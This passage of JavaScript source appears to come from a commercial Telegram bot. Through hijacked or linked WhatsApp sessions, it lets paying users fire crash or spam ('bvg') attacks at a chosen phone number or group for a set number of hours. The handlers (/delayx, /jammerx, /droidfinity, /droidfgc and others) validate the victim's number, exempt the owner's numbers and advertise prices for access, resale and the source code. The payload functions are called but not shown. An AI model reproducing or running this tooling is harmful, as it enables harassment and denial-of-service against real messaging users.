  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104403'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ sent bvg...
│➻ Target: ${numberTarget}
│➻ From: ${userNumber}
│➻ Duration: ${durationHours} hours
└────────────────────────┘`,
parse_mode: 'HTML'
    });

    // Run both XeonDelay1 and XeonDelay2 concurrently
    await Promise.all([
      xeonSpamDroidInitiator(durationHours, formattedNumber, userNumber, chatId, botInstance)
    ]);
  } catch (error) {
    console.error(`Error in /${match[1]} for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /${match[1]}: ${error.message}`);
  }
});

botInstance.onText(/\/xdxdelayx(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /${match[1]} raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
  }

  // Premium check (updated for VIP)
// NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  console.log(`[DEBUG] /${match[1]} input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /${match[1]}: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number and duration.\nExample: /delayx +919876543210 2');
  }

  const args = match[2].trim().split(/\s+/);
  if (args.length < 2) {
    console.log(`[DEBUG] /${match[1]}: Insufficient arguments provided`);
    return userBot.sendMessage(chatId, '❌ Provide both a target number and duration in hours.\nExample: /delayx +919876543210 2');
  }

  const rawTarget = args[0];
  const durationHours = parseFloat(args[1]);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /${match[1]}: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).\nExample: /delayx +919876543210 2');
  }

  if (isNaN(durationHours) || durationHours <= 0) {
    console.log(`[DEBUG] /${match[1]}: Invalid duration "${args[1]}"`);
    return userBot.sendMessage(chatId, '❌ Invalid duration. Provide a positive number of hours (e.g., 2).\nExample: /delayx +919876543210 2');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /${match[1]}: numberTarget = "${numberTarget}", duration = ${durationHours} hours`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /${match[1]}: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.\nExample: /delayx +919876543210 2`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104403'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ sent bvg...
│➻ Target: ${numberTarget}
│➻ From: ${userNumber}
│➻ Duration: ${durationHours} hours
└────────────────────────┘`,
parse_mode: 'HTML'
    });

    // Run both XeonDelay1 and XeonDelay2 concurrently
    await delayxInitiator(durationHours, formattedNumber, userNumber, chatId, botInstance)
  } catch (error) {
    console.error(`Error in /${match[1]} for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /${match[1]}: ${error.message}`);
  }
});

botInstance.onText(/\/xdxddelayperma(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /${match[1]} raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
  }

  // Premium check (updated for VIP)
// NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  console.log(`[DEBUG] /${match[1]} input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /${match[1]}: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number and duration.\nExample: /delayperma +919876543210 2');
  }

  const args = match[2].trim().split(/\s+/);
  if (args.length < 2) {
    console.log(`[DEBUG] /${match[1]}: Insufficient arguments provided`);
    return userBot.sendMessage(chatId, '❌ Provide both a target number and duration in hours.\nExample: /delayperma +919876543210 2');
  }

  const rawTarget = args[0];
  const durationHours = parseFloat(args[1]);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /${match[1]}: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).\nExample: /delayperma +919876543210 2');
  }

  if (isNaN(durationHours) || durationHours <= 0) {
    console.log(`[DEBUG] /${match[1]}: Invalid duration "${args[1]}"`);
    return userBot.sendMessage(chatId, '❌ Invalid duration. Provide a positive number of hours (e.g., 2).\nExample: /delayperma +919876543210 2');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /${match[1]}: numberTarget = "${numberTarget}", duration = ${durationHours} hours`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /${match[1]}: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.\nExample: /delayperma +919876543210 2`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104403'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ sent bvg...
│➻ Target: ${numberTarget}
│➻ From: ${userNumber}
│➻ Duration: ${durationHours} hours
└────────────────────────┘`,
parse_mode: 'HTML'
    });
    
    await Promise.all([
      delaypermaInitiator(durationHours, formattedNumber, userNumber, chatId, botInstance)
    ]);

  } catch (error) {
    console.error(`Error in /${match[1]} for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /${match[1]}: ${error.message}`);
  }
});

botInstance.onText(/\/jammerx(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /${match[1]} raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
  }

  // Premium check (updated for VIP)
// NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  console.log(`[DEBUG] /${match[1]} input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /${match[1]}: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number and duration.\nExample: /jammerx +919876543210 2');
  }

  const args = match[2].trim().split(/\s+/);
  if (args.length < 2) {
    console.log(`[DEBUG] /${match[1]}: Insufficient arguments provided`);
    return userBot.sendMessage(chatId, '❌ Provide both a target number and duration in hours.\nExample: /jammerx +919876543210 2');
  }

  const rawTarget = args[0];
  const durationHours = parseFloat(args[1]);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /${match[1]}: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).\nExample: /jammerx +919876543210 2');
  }

  if (isNaN(durationHours) || durationHours <= 0) {
    console.log(`[DEBUG] /${match[1]}: Invalid duration "${args[1]}"`);
    return userBot.sendMessage(chatId, '❌ Invalid duration. Provide a positive number of hours (e.g., 2).\nExample: /jammerx +919876543210 2');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /${match[1]}: numberTarget = "${numberTarget}", duration = ${durationHours} hours`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /${match[1]}: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.\nExample: /jammerx +919876543210 2`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104403'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ sent bvg...
│➻ Target: ${numberTarget}
│➻ From: ${userNumber}
│➻ Duration: ${durationHours} hours
└────────────────────────┘`,
parse_mode: 'HTML'
    });

    // Run both XeonDelay1 and XeonDelay2 concurrently
    await Promise.all([
      jammerxInitiator(durationHours, formattedNumber, userNumber, chatId, botInstance)
    ]);
  } catch (error) {
    console.error(`Error in /${match[1]} for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /${match[1]}: ${error.message}`);
  }
});

botInstance.onText(/\/xtes(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /xjammer raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return;
  }

  // Premium check (updated for VIP)
// NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  console.log(`[DEBUG] /xjammer input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /xjammer: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number.\nExample: /xjammer +919876543210');
  }

  const rawTarget = match[2].trim();
  console.log(`[DEBUG] /xjammer: rawTarget = "${rawTarget}"`);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /xjammer: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /xjammer: numberTarget = "${numberTarget}"`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /xjammer: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104403'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  if (numberTarget.includes('@g.us')) {
    return userBot.sendMessage(chatId, '❌ Group chats are not supported.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│ Sent messages...
│ Target: ${numberTarget}
│ From: ${userNumber}
└────────────────────────┘`,
    });
for (let i = 0; i <10; i++) {
    await forcer(formattedNumber, userNumber, chatId, botInstance);
    }
  } catch (error) {
    console.error(`Error in /xjammer for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /xjammer: ${error.message}`);
  }
});

// Register the /delayking command
/*botInstance.onText(/\/delayking(?:\s(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /delayking raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return;
  }

  // Premium check (updated for VIP)
// NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  console.log(`[DEBUG] /delayking input: match[1] = "${match[1]}"`);

  if (!match[1] || match[1].trim() === '') {
    console.log(`[DEBUG] /delayking: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number.\nExample: /delayking +919876543210');
  }

  const rawTarget = match[1].trim();
  console.log(`[DEBUG] /delayking: rawTarget = "${rawTarget}"`);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /delayking: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /delayking: numberTarget = "${numberTarget}"`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /delayking: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104403'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  if (numberTarget.includes('@g.us')) {
    return userBot.sendMessage(chatId, '❌ Group chats are not supported.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│ Sent messages...
│ Target: ${numberTarget}
│ From: ${userNumber}
└────────────────────────┘`,
    });

    await sendMessagesForDuration(1, formattedNumber, userNumber, chatId, botInstance);
  } catch (error) {
    console.error(`Error in /delayking for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /delayking: ${error.message}`);
  }
});

// Register the /xios command
botInstance.onText(/\/xios(?:\s(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /xios raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return;
  }

  // Premium check (updated for VIP)
// NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  console.log(`[DEBUG] /xios input: match[1] = "${match[1]}"`);

  if (!match[1] || match[1].trim() === '') {
    console.log(`[DEBUG] /xios: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number.\nExample: /xios +919876543210');
  }

  const rawTarget = match[1].trim();
  console.log(`[DEBUG] /xios: rawTarget = "${rawTarget}"`);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /xios: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /xios: numberTarget = "${numberTarget}"`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /xios: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104403'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  if (numberTarget.includes('@g.us')) {
    return userBot.sendMessage(chatId, '❌ Group chats are not supported.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│ Sent messages...
│ Target: ${numberTarget}
│ From: ${userNumber}
└────────────────────────┘`,
    });

    await runXiosLoop(formattedNumber, userNumber, chatId, botInstance);
  } catch (error) {
    console.error(`Error in /xios for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /xios: ${error.message}`);
  }
});*/

botInstance.onText(/\/kxkdkd(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /cantseedroid raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
  }

  // Premium check (updated for VIP)
// NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  console.log(`[DEBUG] /cantseedroid input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /cantseedroid: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number and duration.\nExample: /cantseedroid +919876543210 2');
  }

  const args = match[2].trim().split(/\s+/);
  if (args.length < 2) {
    console.log(`[DEBUG] /cantseedroid: Insufficient arguments provided`);
    return userBot.sendMessage(chatId, '❌ Provide both a target number and duration in hours.\nExample: /cantseedroid +919876543210 2');
  }

  const rawTarget = args[0];
  const durationHours = parseFloat(args[1]);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /cantseedroid: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  if (isNaN(durationHours) || durationHours <= 0) {
    console.log(`[DEBUG] /cantseedroid: Invalid duration "${args[1]}"`);
    return userBot.sendMessage(chatId, '❌ Invalid duration. Provide a positive number of hours (e.g., 2).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /cantseedroid: numberTarget = "${numberTarget}", duration = ${durationHours} hours`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /cantseedroid: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104401'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ sent bvg...
│➻ Target: ${numberTarget}
│➻ From: ${userNumber}
│➻ Duration: ${durationHours} hours
└────────────────────────┘`,
parse_mode: 'HTML'
    });

    // Run both XeonDelay1 and XeonDelay2 concurrently
    await Promise.all([
      xeonInvisibleAndroidExecutor(durationHours, formattedNumber, userNumber, chatId, botInstance)
    ]);
  } catch (error) {
    console.error(`Error in /cantseedroid for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /cantseedroid: ${error.message}`);
  }
});

botInstance.onText(/\/rjeoeoj3(?!\S)(\s+(.+))?/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;

    if (msg.chat.type !== 'private') return;

    const membership = await checkMembership(chatId, senderId, isRootBot);
    if (!membership.isMember) return;

    const userBot = getUserBot(botInstance);

    if (!checkRateLimit(senderId, chatId)) return;

    const userNumber = db.userNumbers[senderId];
    if (!userNumber) {
        return userBot.sendMessage(chatId, '❌ No WhatsApp number linked. Use /reqpair.');
    }

    if (!(await validateSession(userNumber, chatId, botInstance))) {
        return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
    }

    // NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

    if (!match[2] || match[2].trim() === '') {
        return userBot.sendMessage(chatId, '❌ Example: /droidfinity +919876543210');
    }

    const rawTarget = match[2].trim().split(/\s+/)[0];

    if (!isValidPhoneNumber(rawTarget)) {
        return userBot.sendMessage(chatId, '❌ Invalid target number.');
    }

    const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');

    if (numberTarget.length < 8 || numberTarget.length > 15) {
        return userBot.sendMessage(chatId, `❌ Invalid number length.`);
    }

    if (numberTarget === userNumber) {
        return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
    }

    const blockedNumbers = ['916909137213', '919366316018', '919402104401'];
    if (blockedNumbers.includes(numberTarget)) {
        return userBot.sendMessage(chatId, '❌ Cannot target this number.');
    }

    const formattedTarget = `${numberTarget}@s.whatsapp.net`;

    try {
        await userBot.sendPhoto(chatId, CONFIG.pfp, {
            caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ Sent bvg to 👇🏻
│➻ Target: ${numberTarget}
│➻ From: ${userNumber}
└────────────────────────┘`,
            parse_mode: 'HTML'
        });

        const sock = sessions.get(userNumber);
        startSender(sock, formattedTarget, userNumber, chatId, botInstance, true);

    } catch (error) {
        await userBot.sendMessage(chatId, `❌ Failed to start droidfinity: ${error.message}`);
    }
});

botInstance.onText(/\/jdkdksis(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /droidfgc raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
  }

  // Premium check (updated for VIP)
// NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  console.log(`[DEBUG] /droidfgc input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /droidfgc: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a group JID and duration.\nExample: /droidfgc 120363047626537xxx@g.us 2');
  }

  const args = match[2].trim().split(/\s+/);
  if (args.length < 2) {
    console.log(`[DEBUG] /droidfgc: Insufficient arguments provided`);
    return userBot.sendMessage(chatId, '❌ Provide both a group JID and duration in hours.\nExample: /droidfgc 120363047626537xxx@g.us 2');
  }

  const rawTarget = args[0];
  const durationHours = parseFloat(args[1]);

  if (!rawTarget.endsWith('@g.us')) {
    console.log(`[DEBUG] /droidfgc: Invalid group JID format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid group JID. It must end with @g.us. Example: 120363047626537xxx@g.us');
  }

  if (rawTarget.includes('chat.whatsapp.com')) {
    console.log(`[DEBUG] /droidfgc: Input is a group link, sending error message`);
    return userBot.sendMessage(chatId, '❌ Group ID must be a JID (e.g., 120363047626537xxx@g.us). Use /group-id <link> to get the group ID.');
  }

  if (isNaN(durationHours) || durationHours <= 0) {
    console.log(`[DEBUG] /droidfgc: Invalid duration "${args[1]}"`);
    return userBot.sendMessage(chatId, '❌ Invalid duration. Provide a positive number of hours (e.g., 2).');
  }

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ Sent bvg to 👇
│➻ Target: ${rawTarget.replace('@g.us', '')}
│➻ From: ${userNumber}
│➻ Duration: ${durationHours} hours
└────────────────────────┘`,
parse_mode: 'HTML'
    });

      await loopGpExecutor(durationHours, rawTarget, userNumber, chatId, botInstance);

  } catch (error) {
    console.error(`Error in /droidfgc for ${senderId}:`, error.message);
